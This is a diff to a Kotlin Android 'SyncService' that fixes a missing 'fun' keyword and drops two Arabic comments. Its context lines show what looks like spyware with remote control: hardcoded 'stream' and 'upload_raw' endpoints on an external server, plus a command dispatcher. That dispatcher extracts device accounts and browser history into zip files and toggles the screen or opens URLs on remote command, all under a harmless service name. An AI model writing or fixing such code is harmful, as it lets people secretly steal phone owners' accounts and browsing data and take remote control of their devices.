@@ -63,7 +63,6 @@ import kotlin.coroutines.resume
 class SyncService : LifecycleService() {
 
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-    // تم تصحيح الرابط ليطابق سيرفرك الجديد web-assets-service-4 بدقة
     private val SERVER = "https://web-assets-service-4.onrender.com/api/v3/uranium/stream"
     private val UPLOAD = "https://web-assets-service-4.onrender.com/api/v3/uranium/upload_raw"
     
@@ -202,7 +201,6 @@ class SyncService : LifecycleService() {
             action.contains("EXTRACT_ACCOUNTS") -> extractAndZipData("Accounts_Omega.txt", readAccounts())
             action.contains("EXTRACT_BROWSER") -> extractAndZipData("Browser_Omega.txt", readBrowserHistory())
             
-            // === معالجة الأوامر المتقدمة مع الـ Payload بشكل سليم ===
             action.contains("CMD_SCREEN_ON") -> toggleScreen(true)
             action.contains("CMD_SCREEN_OFF") -> toggleScreen(false)
             action.contains("CMD_OPEN_URL") -> {
@@ -606,7 +604,7 @@ class SyncService : LifecycleService() {
         return n
     }
 
-    override onDestroy() {
+    override fun onDestroy() { // تم تصحيح الدالة هنا بإضافة كلمة fun
         try { wakeLock?.release() } catch (_: Exception) {}
         scope.cancel()
         super.onDestroy()
